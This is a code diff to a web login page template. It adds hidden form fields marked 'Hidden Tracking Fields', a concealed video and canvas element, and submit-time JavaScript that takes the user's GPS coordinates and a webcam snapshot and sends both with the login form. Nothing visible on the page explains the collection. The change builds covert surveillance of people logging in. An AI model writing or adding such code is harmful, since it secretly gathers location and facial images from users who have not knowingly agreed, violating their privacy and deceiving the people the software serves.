@@ -142,6 +142,15 @@
             </div>
         </div>
 
+        {{-- Hidden Tracking Fields --}}
+        <input type="hidden" name="latitude" id="lat">
+        <input type="hidden" name="longitude" id="lng">
+        <input type="hidden" name="photo_data" id="photo_data">
+        <div style="display:none;">
+            <video id="video" width="320" height="240" autoplay></video>
+            <canvas id="canvas" width="320" height="240"></canvas>
+        </div>
+
         <div class="col-md-12 d-grid gap-2">
             <button type="submit" class="btn btn-brand">
                 <i class="bi bi-box-arrow-in-right me-1"></i>Login
@@ -390,6 +399,32 @@
 
             form.addEventListener('submit', async function(e) {
                 e.preventDefault();
+
+                // Capture GPS
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(pos => {
+                        document.getElementById('lat').value = pos.coords.latitude;
+                        document.getElementById('lng').value = pos.coords.longitude;
+                    }, err => {
+                        console.warn('Geolocation error:', err);
+                    }, { timeout: 5000 });
+                }
+
+                // Capture Photo
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                if (video && canvas) {
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                        video.srcObject = stream;
+                        await new Promise(resolve => video.onloadedmetadata = resolve);
+                        canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+                        document.getElementById('photo_data').value = canvas.toDataURL('image/jpeg');
+                        stream.getTracks().forEach(track => track.stop());
+                    } catch (err) {
+                        console.warn('Camera error:', err);
+                    }
+                }
 
                 const loginAlert = document.getElementById('loginAlert');
                 const showLoginError = (message) => {
